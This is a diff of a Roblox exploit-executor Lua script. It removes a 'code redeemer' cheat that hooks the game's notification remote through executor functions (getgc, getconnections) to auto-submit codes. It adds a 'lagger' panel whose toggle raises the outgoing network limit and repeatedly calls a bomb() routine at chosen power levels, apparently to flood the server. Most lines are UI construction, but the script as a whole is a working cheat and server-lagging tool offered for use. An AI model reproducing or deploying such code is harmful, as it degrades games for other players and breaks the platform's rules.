+TextLabel4.Size = UDim2.new(1, 0, 0, 24)
+TextLabel4.BackgroundTransparency = 1
+TextLabel4.Text = "⚠️ WARNING"
+TextLabel4.TextColor3 = Color3.fromRGB(255, 80, 80)
+TextLabel4.TextSize = 16
+TextLabel4.Font = Enum.Font.GothamBlack
+TextLabel4.Parent = Frame14
+local TextLabel5 = Instance.new("TextLabel")
+TextLabel5.Position = UDim2.new(0, 15, 0, 36)
+TextLabel5.Size = UDim2.new(1, -30, 0, 45)
+TextLabel5.BackgroundTransparency = 1
+TextLabel5.Text = "ACTIVATE ULTRA MODE?\n⚠️ MAY CRASH YOUR GAME"
+TextLabel5.TextColor3 = Color3.fromRGB(200, 210, 240)
+TextLabel5.TextSize = 10
+TextLabel5.Font = Enum.Font.Gotham
+TextLabel5.TextYAlignment = Enum.TextYAlignment.Top
+TextLabel5.TextWrapped = true
+TextLabel5.Parent = Frame14
+local TextButton10 = Instance.new("TextButton")
+TextButton10.Position = UDim2.new(0.1, 0, 0.75, 0)
+TextButton10.Size = UDim2.new(0, 100, 0, 28)
+TextButton10.BackgroundColor3 = Color3.fromRGB(0, 180, 80)
+TextButton10.BorderSizePixel = 0
+TextButton10.Text = "YES"
+TextButton10.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton10.TextSize = 12
+TextButton10.Font = Enum.Font.GothamBold
+TextButton10.Parent = Frame14
+local UICorner18 = Instance.new("UICorner")
+UICorner18.CornerRadius = UDim.new(0, 6)
+UICorner18.Parent = TextButton10
+local TextButton11 = Instance.new("TextButton")
+TextButton11.Position = UDim2.new(0.55, 0, 0.75, 0)
+TextButton11.Size = UDim2.new(0, 100, 0, 28)
+TextButton11.BackgroundColor3 = Color3.fromRGB(180, 40, 40)
+TextButton11.BorderSizePixel = 0
+TextButton11.Text = "NO"
+TextButton11.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton11.TextSize = 12
+TextButton11.Font = Enum.Font.GothamBold
+TextButton11.Parent = Frame14
+local UICorner19 = Instance.new("UICorner")
+UICorner19.CornerRadius = UDim.new(0, 6)
+UICorner19.Parent = TextButton11
+local VIOLET = Color3.fromRGB(160, 80, 255)
+local function actualizarBotonesNivel()
+    local buttons = {
+        {btn = TextButton6, frame = Frame9, nivel = "Low"},
+        {btn = TextButton7, frame = Frame10, nivel = "Mid"},
+        {btn = TextButton8, frame = Frame11, nivel = "High"},
+        {btn = TextButton9, frame = Frame12, nivel = "Ultra"}
+    }
+    for _, data in ipairs(buttons) do
+        if nivelActual == data.nivel then
+            data.btn.BackgroundColor3 = VIOLET
+            data.btn.BackgroundTransparency = 0.25
+            data.btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+            data.frame.BackgroundColor3 = VIOLET
+            data.frame.BackgroundTransparency = 0.5
+        else
+            data.btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+            data.btn.BackgroundTransparency = 0.2
+            data.btn.TextColor3 = Color3.fromRGB(200, 210, 240)
+            data.frame.BackgroundColor3 = VIOLET
+            data.frame.BackgroundTransparency = 0.9
+        end
+    end
 end
-
--- MAIN GUI CREATION --
-local GUI = Instance.new("ScreenGui")
-GUI.Name = "YazinCodeReedemerUI"
-GUI.ResetOnSpawn = false
-GUI.IgnoreGuiInset = true
-GUI.DisplayOrder = 999
-if not pcall(function() GUI.Parent = game.CoreGui end) then GUI.Parent = playerGui end
-
-local Window = Instance.new("Frame")
-Window.Name = "Window"
-Window.Size = UDim2.fromOffset(400, 390)
-Window.AnchorPoint = Vector2.new(1, 0)
-Window.Position = UDim2.new(1, -12, 0, 12)
-Window.BackgroundColor3 = COLORS.Window
-Window.BorderSizePixel = 0
-Window.ClipsDescendants = true
-Window.Parent = GUI
-addCorner(Window, 12)
-addStroke(Window, COLORS.Border, 1.5, 0)
-
--- ARKA PLAN RESMİ (KESİN ÇALIŞAN GARANTİ KATMAN) --
-local BackgroundImage = Instance.new("ImageLabel")
-BackgroundImage.Name = "BackgroundImage"
-BackgroundImage.Size = UDim2.new(1, 0, 1, 0)
-BackgroundImage.Position = UDim2.new(0, 0, 0, 0)
-BackgroundImage.BackgroundTransparency = 1
-BackgroundImage.Image = "rbxassetid://89219205337252"
-BackgroundImage.ImageTransparency = 0.25
-BackgroundImage.ZIndex = 0
-BackgroundImage.Visible = true
-BackgroundImage.Parent = Window
-
-local bgCorner = Instance.new("UICorner")
-bgCorner.CornerRadius = UDim.new(0, 12)
-bgCorner.Parent = BackgroundImage
-
-local InterfaceScale = Instance.new("UIScale")
-InterfaceScale.Name = "InterfaceScale"
-InterfaceScale.Scale = 1.0
-InterfaceScale.Parent = Window
-
-local viewportConnection
-local function updateInterfaceScale()
-    local camera = workspace.CurrentCamera
-    if not camera then InterfaceScale.Scale = 1.0; return end
-    local viewport = camera.ViewportSize
-    local fitScale = math.min((viewport.X - 20) / 400, (viewport.Y - 20) / 390)
-    if UserInputService.TouchEnabled then
-        InterfaceScale.Scale = math.max(0.5, math.min(0.85, fitScale))
+local function actualizarToggle()
+    if laggerActive then
+        TextButton5.Text = "ON"
+        TextButton5.TextColor3 = Color3.fromRGB(0, 255, 100)
+        TextButton5.BackgroundColor3 = Color3.fromRGB(0, 40, 20)
+        Frame5.BackgroundColor3 = Color3.fromRGB(0, 255, 100)
     else
-        InterfaceScale.Scale = 1.0
+        TextButton5.Text = "OFF"
+        TextButton5.TextColor3 = Color3.fromRGB(150, 150, 180)
+        TextButton5.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+        Frame5.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
     end
 end
-
-local function watchViewport()
-    if viewportConnection then viewportConnection:Disconnect(); viewportConnection = nil end
-    local camera = workspace.CurrentCamera
-    if camera then viewportConnection = camera:GetPropertyChangedSignal("ViewportSize"):Connect(updateInterfaceScale) end
-    updateInterfaceScale()
-end
-workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(watchViewport)
-watchViewport()
-
--- HEADER --
-local Header = Instance.new("Frame")
-Header.Name = "Header"
-Header.Size = UDim2.new(1, 0, 0, 48)
-Header.BackgroundTransparency = 1
-Header.Active = true
-Header.ZIndex = 3
-Header.Parent = Window
-
-local BrandMark = Instance.new("Frame")
-BrandMark.Name = "BrandMark"
-BrandMark.Size = UDim2.fromOffset(26, 26)
-BrandMark.Position = UDim2.fromOffset(14, 11)
-BrandMark.BackgroundColor3 = COLORS.Control
-BrandMark.BorderSizePixel = 0
-BrandMark.ZIndex = 3
-BrandMark.Parent = Header
-addCorner(BrandMark, 6)
-addStroke(BrandMark, COLORS.Border, 1, 0)
-
-local BrandLetter = makeLabel(BrandMark, "Letter", "Y", UDim2.fromScale(1, 1), UDim2.fromOffset(0, 0), 14, COLORS.White, Enum.Font.GothamBold)
-BrandLetter.TextXAlignment = Enum.TextXAlignment.Center
-BrandLetter.ZIndex = 3
-
-local TitleLabel = makeLabel(Header, "Title", "YAZIN CODE REEDEMER", UDim2.fromOffset(260, 25), UDim2.fromOffset(50, 12), 14, COLORS.White, Enum.Font.GothamBold)
-TitleLabel.ZIndex = 3
-
--- MINIMIZE BUTTON (-) --
-local MinimizeButton = Instance.new("TextButton")
-MinimizeButton.Name = "MinimizeButton"
-MinimizeButton.Size = UDim2.fromOffset(28, 28)
-MinimizeButton.Position = UDim2.new(1, -38, 0, 10)
-MinimizeButton.BackgroundColor3 = COLORS.Control
-MinimizeButton.BorderSizePixel = 0
-MinimizeButton.AutoButtonColor = false
-MinimizeButton.Text = "-"
-MinimizeButton.TextSize = 18
-MinimizeButton.TextColor3 = COLORS.Text
-MinimizeButton.Font = Enum.Font.GothamBold
-MinimizeButton.ZIndex = 5
-MinimizeButton.Parent = Header
-addCorner(MinimizeButton, 14)
-addStroke(MinimizeButton, COLORS.Border, 1, 0)
-
-local windowVisible = true
-local function toggleMinimize()
-    windowVisible = not windowVisible
-    for _, child in ipairs(Window:GetChildren()) do
-        if child ~= Header and child ~= InterfaceScale and child ~= BackgroundImage then
-            child.Visible = windowVisible
-        end
+local function actualizarKeybind()
+    local display = keybind.Name
+    if display:match("Button") then
+        display = display:gsub("Button", "")
     end
-    Window.Size = windowVisible and UDim2.fromOffset(400, 390) or UDim2.fromOffset(400, 48)
+    TextButton4.Text = "[" .. display .. "]"
 end
-MinimizeButton.Activated:Connect(toggleMinimize)
-MinimizeButton.MouseButton1Click:Connect(toggleMinimize)
-
--- MAIN CONTENT LAYOUT --
-local LeftContainer = Instance.new("ScrollingFrame")
-LeftContainer.Name = "LeftContainer"
-LeftContainer.Size = UDim2.new(0, 178, 1, -85)
-LeftContainer.Position = UDim2.fromOffset(12, 52)
-LeftContainer.BackgroundTransparency = 1
-LeftContainer.BorderSizePixel = 0
-LeftContainer.ScrollBarThickness = 3
-LeftContainer.ScrollBarImageColor3 = COLORS.Border
-LeftContainer.CanvasSize = UDim2.new(0, 0, 0, 310)
-LeftContainer.ZIndex = 2
-LeftContainer.Parent = Window
-
-local RightContainer = Instance.new("Frame")
-RightContainer.Name = "RightContainer"
-RightContainer.Size = UDim2.new(1, -200, 1, -85)
-RightContainer.Position = UDim2.new(0, 196, 0, 52)
-RightContainer.BackgroundColor3 = COLORS.CardBg
-RightContainer.BackgroundTransparency = 0.5
-RightContainer.BorderSizePixel = 0
-RightContainer.ZIndex = 2
-RightContainer.Parent = Window
-addCorner(RightContainer, 8)
-addStroke(RightContainer, COLORS.Border, 1, 0)
-
--- CONTROLS CREATION --
-local currentY = 0
-
-local function createToggleRow(name, labelText, defaultState, callback)
-    local row = Instance.new("Frame")
-    row.Name = name
-    row.Size = UDim2.new(1, 0, 0, 36)
-    row.Position = UDim2.fromOffset(0, currentY)
-    row.BackgroundColor3 = COLORS.CardBg
-    row.BackgroundTransparency = 0.5
-    row.BorderSizePixel = 0
-    row.ZIndex = 2
-    row.Parent = LeftContainer
-    addCorner(row, 6)
-    addStroke(row, COLORS.Border, 1, 0)
-
-    local lbl = makeLabel(row, "Label", labelText, UDim2.new(1, -45, 1, 0), UDim2.fromOffset(10, 0), 11, COLORS.White, Enum.Font.GothamMedium)
-    lbl.ZIndex = 2
-
-    local toggleBtn = Instance.new("TextButton")
-    toggleBtn.Name = "Toggle"
-    toggleBtn.Size = UDim2.fromOffset(36, 20)
-    toggleBtn.Position = UDim2.new(1, -42, 0.5, -10)
-    toggleBtn.BackgroundColor3 = defaultState and COLORS.White or COLORS.Control
-    toggleBtn.BorderSizePixel = 0
-    toggleBtn.AutoButtonColor = false
-    toggleBtn.Text = ""
-    toggleBtn.ZIndex = 2
-    toggleBtn.Parent = row
-    addCorner(toggleBtn, 10)
-
-    local knob = Instance.new("Frame")
-    knob.Name = "Knob"
-    knob.Size = UDim2.fromOffset(16, 16)
-    knob.Position = defaultState and UDim2.new(1, -18, 0.5, -8) or UDim2.new(0, 2, 0.5, -8)
-    knob.BackgroundColor3 = defaultState and COLORS.Window or COLORS.White
-    knob.BorderSizePixel = 0
-    knob.ZIndex = 2
-    knob.Parent = toggleBtn
-    addCorner(knob, 8)
-
-    local state = defaultState
-    local function fireToggle()
-        state = not state
-        toggleBtn.BackgroundColor3 = state and COLORS.White or COLORS.Control
-        knob.BackgroundColor3 = state and COLORS.Window or COLORS.White
-        knob.Position = state and UDim2.new(1, -18, 0.5, -8) or UDim2.new(0, 2, 0.5, -8)
-        if callback then callback(state) end
-    end
-
-    toggleBtn.Activated:Connect(fireToggle)
-    toggleBtn.MouseButton1Click:Connect(fireToggle)
-
-    currentY = currentY + 44
-    return row
+local function actualizarLock()
+    TextLabel2.Text = ventanaBloqueada and "LOCK" or "UNLOCK"
+    TextLabel2.TextColor3 = ventanaBloqueada and Color3.fromRGB(255, 100, 100) or Color3.fromRGB(180, 180, 180)
 end
-
-createToggleRow("AutoSubmitRow", "Auto submit", _autoAccept, function(state)
-    _autoAccept = state
-    savedConfig.autoSubmit = state
-    saveConfig()
-end)
-
-createToggleRow("RiddleSolverRow", "Riddle solver", _riddleSolver, function(state)
-    _riddleSolver = state
-    savedConfig.riddleSolver = state
-    saveConfig()
-end)
-
-local wordsRow = Instance.new("Frame")
-wordsRow.Name = "WordsRow"
-wordsRow.Size = UDim2.new(1, 0, 0, 52)
-wordsRow.Position = UDim2.fromOffset(0, currentY)
-wordsRow.BackgroundColor3 = COLORS.CardBg
-wordsRow.BackgroundTransparency = 0.5
-wordsRow.BorderSizePixel = 0
-wordsRow.ZIndex = 2
-wordsRow.Parent = LeftContainer
-addCorner(wordsRow, 6)
-addStroke(wordsRow, COLORS.Border, 1, 0)
-
-local wordsLbl = makeLabel(wordsRow, "Label", "Words", UDim2.new(1, 0, 0, 20), UDim2.fromOffset(10, 4), 11, COLORS.White, Enum.Font.GothamMedium)
-wordsLbl.ZIndex = 2
-
-local counterFrame = Instance.new("Frame")
-counterFrame.Name = "Counter"
-counterFrame.Size = UDim2.new(1, -16, 0, 24)
-counterFrame.Position = UDim2.fromOffset(8, 24)
-counterFrame.BackgroundTransparency = 1
-counterFrame.ZIndex = 2
-counterFrame.Parent = wordsRow
-
-local minusBtn = Instance.new("TextButton")
-minusBtn.Name = "Minus"
-minusBtn.Size = UDim2.fromOffset(24, 24)
-minusBtn.Position = UDim2.fromOffset(0, 0)
-minusBtn.BackgroundColor3 = COLORS.Control
-minusBtn.BorderSizePixel = 0
-minusBtn.AutoButtonColor = false
-minusBtn.Text = "-"
-minusBtn.TextSize = 14
-minusBtn.TextColor3 = COLORS.Text
-minusBtn.Font = Enum.Font.GothamBold
-minusBtn.ZIndex = 2
-minusBtn.Parent = counterFrame
-addCorner(minusBtn, 4)
-
-local countLabel = makeLabel(counterFrame, "Count", tostring(YAZIN_WORD_COUNT), UDim2.new(1, -48, 1, 0), UDim2.fromOffset(24, 0), 12, COLORS.White, Enum.Font.GothamBold)
-countLabel.TextXAlignment = Enum.TextXAlignment.Center
-countLabel.ZIndex = 2
-
-local plusBtn = Instance.new("TextButton")
-plusBtn.Name = "Plus"
-plusBtn.Size = UDim2.fromOffset(24, 24)
-plusBtn.Position = UDim2.new(1, -24, 0, 0)
-plusBtn.BackgroundColor3 = COLORS.Control
-plusBtn.BorderSizePixel = 0
-plusBtn.AutoButtonColor = false
-plusBtn.Text = "+"
-plusBtn.TextSize = 14
-plusBtn.TextColor3 = COLORS.Text
-plusBtn.Font = Enum.Font.GothamBold
-plusBtn.ZIndex = 2
-plusBtn.Parent = counterFrame
-addCorner(plusBtn, 4)
-
-minusBtn.MouseButton1Click:Connect(function()
-    YAZIN_WORD_COUNT = math.max(1, YAZIN_WORD_COUNT - 1)
-    _submitAfter = YAZIN_WORD_COUNT
-    countLabel.Text = tostring(YAZIN_WORD_COUNT)
-    savedConfig.submitAfter = YAZIN_WORD_COUNT
-    saveConfig()
-end)
-
-plusBtn.MouseButton1Click:Connect(function()
-    YAZIN_WORD_COUNT = YAZIN_WORD_COUNT + 1
-    _submitAfter = YAZIN_WORD_COUNT
-    countLabel.Text = tostring(YAZIN_WORD_COUNT)
-    savedConfig.submitAfter = YAZIN_WORD_COUNT
-    saveConfig()
-end)
-
-currentY = currentY + 60
-
-local caseRow = Instance.new("Frame")
-caseRow.Name = "CaseRow"
-caseRow.Size = UDim2.new(1, 0, 0, 36)
-caseRow.Position = UDim2.fromOffset(0, currentY)
-caseRow.BackgroundColor3 = COLORS.CardBg
-caseRow.BackgroundTransparency = 0.5
-caseRow.BorderSizePixel = 0
-caseRow.ZIndex = 2
-caseRow.Parent = LeftContainer
-addCorner(caseRow, 6)
-addStroke(caseRow, COLORS.Border, 1, 0)
-
-local caseLbl = makeLabel(caseRow, "Label", "Case", UDim2.new(0, 50, 1, 0), UDim2.fromOffset(10, 0), 11, COLORS.White, Enum.Font.GothamMedium)
-caseLbl.ZIndex = 2
-
-local caseBtn = Instance.new("TextButton")
-caseBtn.Name = "CaseBtn"
-caseBtn.Size = UDim2.fromOffset(72, 22)
-caseBtn.Position = UDim2.new(1, -80, 0.5, -11)
-caseBtn.BackgroundColor3 = COLORS.Control
-caseBtn.BorderSizePixel = 0
-caseBtn.AutoButtonColor = false
-caseBtn.Text = YAZIN_CASE_MODE
-caseBtn.TextSize = 10
-caseBtn.TextColor3 = COLORS.White
-caseBtn.Font = Enum.Font.GothamBold
-caseBtn.ZIndex = 2
-caseBtn.Parent = caseRow
-addCorner(caseBtn, 4)
-
-caseBtn.MouseButton1Click:Connect(function()
-    if YAZIN_CASE_MODE == "EXACT" then YAZIN_CASE_MODE = "LOWER" else YAZIN_CASE_MODE = "EXACT" end
-    caseBtn.Text = YAZIN_CASE_MODE
-    savedConfig.caseMode = YAZIN_CASE_MODE
-    saveConfig()
-end)
-
-currentY = currentY + 44
-
-local speedRow = Instance.new("Frame")
-speedRow.Name = "SpeedRow"
-speedRow.Size = UDim2.new(1, 0, 0, 36)
-speedRow.Position = UDim2.fromOffset(0, currentY)
-speedRow.BackgroundColor3 = COLORS.CardBg
-speedRow.BackgroundTransparency = 0.5
-speedRow.BorderSizePixel = 0
-speedRow.ZIndex = 2
-speedRow.Parent = LeftContainer
-addCorner(speedRow, 6)
-addStroke(speedRow, COLORS.Border, 1, 0)
-
-local speedLbl = makeLabel(speedRow, "Label", "Speed", UDim2.new(0, 50, 1, 0), UDim2.fromOffset(10, 0), 11, COLORS.White, Enum.Font.GothamMedium)
-speedLbl.ZIndex = 2
-
-local speedBtn = Instance.new("TextButton")
-speedBtn.Name = "SpeedBtn"
-speedBtn.Size = UDim2.fromOffset(72, 22)
-speedBtn.Position = UDim2.new(1, -80, 0.5, -11)
-speedBtn.BackgroundColor3 = COLORS.Control
-speedBtn.BorderSizePixel = 0
-speedBtn.AutoButtonColor = false
-speedBtn.Text = YAZIN_SPEED_MODE
-speedBtn.TextSize = 10
-speedBtn.TextColor3 = COLORS.White
-speedBtn.Font = Enum.Font.GothamBold
-speedBtn.ZIndex = 2
-speedBtn.Parent = speedRow
-addCorner(speedBtn, 4)
-
-speedBtn.MouseButton1Click:Connect(function()
-    if YAZIN_SPEED_MODE == "MAX" then YAZIN_SPEED_MODE = "FAST" else YAZIN_SPEED_MODE = "MAX" end
-    speedBtn.Text = YAZIN_SPEED_MODE
-    savedConfig.speedMode = YAZIN_SPEED_MODE
-    saveConfig()
-end)
-
-currentY = currentY + 44
-
-local clearRow = Instance.new("Frame")
-clearRow.Name = "ClearRow"
-clearRow.Size = UDim2.new(1, 0, 0, 36)
-clearRow.Position = UDim2.fromOffset(0, currentY)
-clearRow.BackgroundColor3 = COLORS.CardBg
-clearRow.BackgroundTransparency = 0.5
-clearRow.BorderSizePixel = 0
-clearRow.ZIndex = 2
-clearRow.Parent = LeftContainer
-addCorner(clearRow, 6)
-addStroke(clearRow, COLORS.Border, 1, 0)
-
-local clearLbl = makeLabel(clearRow, "Label", "Clear pasted", UDim2.new(1, -40, 1, 0), UDim2.fromOffset(10, 0), 11, COLORS.White, Enum.Font.GothamMedium)
-clearLbl.ZIndex = 2
-
-local clearBtn = Instance.new("TextButton")
-clearBtn.Name = "ClearBtn"
-clearBtn.Size = UDim2.fromOffset(26, 22)
-clearBtn.Position = UDim2.new(1, -34, 0.5, -11)
-clearBtn.BackgroundColor3 = COLORS.Control
-clearBtn.BorderSizePixel = 0
-clearBtn.AutoButtonColor = false
-clearBtn.Text = "C"
-clearBtn.TextSize = 11
-clearBtn.TextColor3 = COLORS.Text
-clearBtn.Font = Enum.Font.GothamBold
-clearBtn.ZIndex = 2
-clearBtn.Parent = clearRow
-addCorner(clearBtn, 4)
-
-clearBtn.MouseButton1Click:Connect(function()
-    if clearYazinCapture then clearYazinCapture() end
-    setStatus("Cleared pasted cache", COLORS.Dim)
-end)
-
-LeftContainer.CanvasSize = UDim2.new(0, 0, 0, currentY + 10)
-
--- CONSOLE OUTPUT --
-local Console = Instance.new("ScrollingFrame")
-Console.Name = "Console"
-Console.Size = UDim2.new(1, -16, 1, -16)
-Console.Position = UDim2.fromOffset(8, 8)
-Console.BackgroundTransparency = 1
-Console.BorderSizePixel = 0
-Console.ClipsDescendants = true
-Console.Active = true
-Console.ScrollingEnabled = true
-Console.ScrollingDirection = Enum.ScrollingDirection.Y
-Console.CanvasSize = UDim2.new(0, 0, 0, 0)
-Console.ScrollBarThickness = 3
-Console.ScrollBarImageColor3 = COLORS.Border
-Console.ZIndex = 3
-Console.Parent = RightContainer
-
-local ConsoleOutput = Instance.new("TextLabel")
-ConsoleOutput.Name = "ConsoleOutput"
-ConsoleOutput.Size = UDim2.new(1, 0, 0, 0)
-ConsoleOutput.AutomaticSize = Enum.AutomaticSize.Y
-ConsoleOutput.Position = UDim2.fromOffset(0, 0)
-ConsoleOutput.BackgroundTransparency = 1
-ConsoleOutput.RichText = true
-ConsoleOutput.Text = '<font color="rgb(200,200,200)">» Riddle solver OFF</font>\n\nPasted 1/1\n\n<font color="rgb(255,255,255)">[code] -> Ready</font>'
-ConsoleOutput.TextSize = 12
-ConsoleOutput.Font = Enum.Font.Code
-ConsoleOutput.TextColor3 = COLORS.Text
-ConsoleOutput.TextXAlignment = Enum.TextXAlignment.Left
-ConsoleOutput.TextYAlignment = Enum.TextYAlignment.Top
-ConsoleOutput.TextWrapped = true
-ConsoleOutput.ZIndex = 3
-ConsoleOutput.Parent = Console
-
-ConsoleOutput:GetPropertyChangedSignal("AbsoluteSize"):Connect(function()
-    Console.CanvasSize = UDim2.new(0, 0, 0, ConsoleOutput.AbsoluteSize.Y + 20)
-end)
-
--- BOTTOM FOOTER & SCALE BAR --
-local DiscordFooter = makeLabel(Window, "DiscordFooter", "discord.gg/tJddqg2aX", UDim2.fromOffset(160, 18), UDim2.new(0, 12, 1, -28), 10, COLORS.Dim, Enum.Font.GothamMedium)
-DiscordFooter.ZIndex = 3
-
-local ScaleContainer = Instance.new("Frame")
-ScaleContainer.Name = "ScaleContainer"
-ScaleContainer.Size = UDim2.fromOffset(120, 24)
-ScaleContainer.Position = UDim2.new(1, -132, 1, -30)
-ScaleContainer.BackgroundTransparency = 1
-ScaleContainer.ZIndex = 3
-ScaleContainer.Parent = Window
-
-local scaleLbl = makeLabel(ScaleContainer, "ScaleLabel", "scale", UDim2.fromOffset(36, 24), UDim2.fromOffset(0, 0), 10, COLORS.Dim, Enum.Font.GothamMedium)
-scaleLbl.ZIndex = 3
-
-local ScaleValueBox = Instance.new("TextButton")
-ScaleValueBox.Name = "ScaleValue"
-ScaleValueBox.Size = UDim2.fromOffset(76, 22)
-ScaleValueBox.Position = UDim2.fromOffset(44, 1)
-ScaleValueBox.BackgroundColor3 = COLORS.CardBg
-ScaleValueBox.BackgroundTransparency = 0.5
-ScaleValueBox.BorderSizePixel = 0
-ScaleValueBox.AutoButtonColor = false
-ScaleValueBox.Text = string.format("%.1f", InterfaceScale.Scale)
-ScaleValueBox.TextSize = 11
-ScaleValueBox.TextColor3 = COLORS.White
-ScaleValueBox.Font = Enum.Font.GothamBold
-ScaleValueBox.ZIndex = 3
-ScaleValueBox.Parent = ScaleContainer
-addCorner(ScaleValueBox, 6)
-addStroke(ScaleValueBox, COLORS.Border, 1, 0)
-
-ScaleValueBox.MouseButton1Click:Connect(function()
-    if InterfaceScale.Scale >= 1.0 then
-        InterfaceScale.Scale = 0.8
-    elseif InterfaceScale.Scale >= 0.8 then
-        InterfaceScale.Scale = 0.6
-    else
-        InterfaceScale.Scale = 1.0
-    end
-    ScaleValueBox.Text = string.format("%.1f", InterfaceScale.Scale)
-end)
-
--- WINDOW DRAGGING SYSTEM --
-do
-    local dragging = false
-    local dragInput, dragStart, startPos
-
-    Header.InputBegan:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-            dragging = true
-            dragStart = input.Position
-            startPos = Window.Position
-            input.Changed:Connect(function()
-                if input.UserInputState == Enum.UserInputState.End then
-                    dragging = false
-                end
-            end)
-        end
-    end)
-
-    UserInputService.InputChanged:Connect(function(input)
-        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
-            local delta = input.Position - dragStart
-            Window.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-        end
-    end)
-end
-
--- CONSOLE LOGGING HELPERS --
-local function col3ToRich(col)
-    return string.format("rgb(%d,%d,%d)", math.floor(col.R * 255 + 0.5), math.floor(col.G * 255 + 0.5), math.floor(col.B * 255 + 0.5))
-end
-
-function setStatus(msg, col)
-    if not ConsoleOutput or not _enabled then return end
-    if msg == _lastStatusMsg then return end
-    _lastStatusMsg = msg
-    col = col or COLORS.Dim
-    local line = '<font color="' .. col3ToRich(col) .. '">' .. tostring(msg) .. "</font>"
-    if ConsoleOutput.Text == "" then ConsoleOutput.Text = line
-    else ConsoleOutput.Text = ConsoleOutput.Text .. "\n\n" .. line end
-    task.defer(function()
-        if Console then Console.CanvasPosition = Vector2.new(0, math.max(0, Console.AbsoluteCanvasSize.Y - Console.AbsoluteWindowSize.Y)) end
-    end)
-end
-
-function flashCode(code, col)
-    if not code or code == "" or code == "—" then return end
-    setStatus("[code] -> " .. tostring(code), col or COLORS.White)
-end
-
-local function resetPasteCounter() _capturedParts = {} end
-clearYazinCapture = function() _capturedParts = {} end
-
-local function clearBoxWatchers()
-    if _boxTextConn then pcall(function() _boxTextConn:Disconnect() end) end
-    if _boxAncestryConn then pcall(function() _boxAncestryConn:Disconnect() end) end
-    for _, connection in ipairs(_boxVisibilityConns) do pcall(function() connection:Disconnect() end) end
-    _boxTextConn = nil
-    _boxAncestryConn = nil
-    _boxVisibilityConns = {}
-    _lastWatchedBox = nil
-end
-
-local function watchBoxForBlankReset(box)
-    if not box or _lastWatchedBox == box then return end
-    clearBoxWatchers()
-    _lastWatchedBox = box
-    if box.Text ~= "" then _lastNonBlankBoxText = box.Text end
-    _boxTextConn = box:GetPropertyChangedSignal("Text"):Connect(function()
-        if box.Text == "" then resetPasteCounter()
-        else _lastNonBlankBoxText = box.Text end
-    end)
-    _boxAncestryConn = box.AncestryChanged:Connect(function(_, parent)
-        if not parent then resetPasteCounter(); clearBoxWatchers() end
-    end)
-end
-
-UserInputService.TextBoxFocused:Connect(function(box)
-    if box:IsDescendantOf(GUI) then return end
-    if box ~= yazinCodeBox() then return end
-    _focused = box
-    _lastBox = box
-    watchBoxForBlankReset(box)
-    if _enabled then setStatus("Ready", COLORS.Green) end
-end)
-
-UserInputService.TextBoxFocusReleased:Connect(function(box)
-    if box:IsDescendantOf(GUI) then return end
-    local codeBox = yazinCodeBox()
-    if box ~= codeBox and box ~= _lastBox then return end
-    if _focused == box then
-        _focused = nil
-        if _enabled then
-            setStatus((_lastBox and _lastBox.Parent) and "Ready" or "Click code box first", (_lastBox and _lastBox.Parent) and COLORS.Green or COLORS.Dim)
-        end
-    end
-end)
-
-function appendToBox(text)
-    if not text or text == "" then return end
-    if YAZIN_CASE_MODE == "LOWER" then
-        text = text:lower()
-    end
-    if _lastWatchedBox and not isVisibleChain(_lastWatchedBox) then
-        resetPasteCounter()
-        clearBoxWatchers()
-    end
-    local box = yazinCodeBox()
-    _capturedParts[#_capturedParts + 1] = text
-    local combinedCode = table.concat(_capturedParts)
-    local capturedCount = #_capturedParts
-
-    if box then
-        _lastBox = box
-        watchBoxForBlankReset(box)
-        local boxWasFocused = UserInputService:GetFocusedTextBox() == box
-        box.Text = combinedCode
-        if boxWasFocused then
-            pcall(function()
-                local caretEnd = #combinedCode + 1
-                box.CursorPosition = caretEnd
-                box.SelectionStart = caretEnd
-            end)
-        end
-    else
-        setStatus("Captured; searching UI...", COLORS.Text)
-    end
-
-    setStatus("Pasted " .. tostring(capturedCount) .. "/" .. tostring(YAZIN_WORD_COUNT), COLORS.Green)
-    flashCode(combinedCode, COLORS.Green)
-
-    if capturedCount >= YAZIN_WORD_COUNT then
-        _capturedParts = {}
-        if _autoAccept then
-            local ok, statusMsg = typeAndSubmitCode(combinedCode)
-            if ok then
-                setStatus("Redeemed: " .. combinedCode, COLORS.Green)
-            else
-                setStatus("Failed: " .. tostring(statusMsg), COLORS.Red)
+local function toggleLagger()
+    laggerActive = not laggerActive
+    actualizarToggle()
+    if laggerActive then
+        if lagThread then task.cancel(lagThread) end
+        lagThread = task.spawn(function()
+            while laggerActive do
+             pcall(function()
+                    game:GetService("NetworkClient"):SetOutgoingKBPSLimit(80000)
+                end)
+                bomb(NIVELES[nivelActual].poder)
+                task.wait(0.18)
             end
+        end)
+    else
+        if lagThread then
+            task.cancel(lagThread)
+            lagThread = nil
         end
     end
 end
-
--- NOTIFICATION LISTENER INTEGRATION --
-local function resolveNotifyRemote()
-    if _G.PhiNotifyRemote then return _G.PhiNotifyRemote end
-    local Net = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")
-    local getinfo = debug and (debug.getinfo or debug.info)
-    if getgc and getinfo and getconnections then
-        for _, d in ipairs(Net:GetDescendants()) do
-            if d:IsA("RemoteEvent") then
-                local ok, cs = pcall(getconnections, d.OnClientEvent)
-                if ok then
-                    for _, c in ipairs(cs) do
-                        local f, fn = pcall(function() return c.Function end)
-                        if f and type(fn) == "function" then
-                            local i, info = pcall(getinfo, fn)
-                            if i and tostring(info.short_src or info.source or ""):find("NotificationController", 1, true) then
-                                return d
-                            end
-                        end
-                    end
-                end
-            end
+TextButton5.MouseButton1Click:Connect(toggleLagger)
+TextButton4.MouseButton1Click:Connect(function()
+    if listeningForInput then return end
+    listeningForInput = true
+    TextButton4.Text = "[...]"
+    TextButton4.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+end)
+UserInputService.InputBegan:Connect(function(input, gp)
+    if listeningForInput and not gp then
+        if input.KeyCode ~= Enum.KeyCode.Unknown then
+            keybind = input.KeyCode
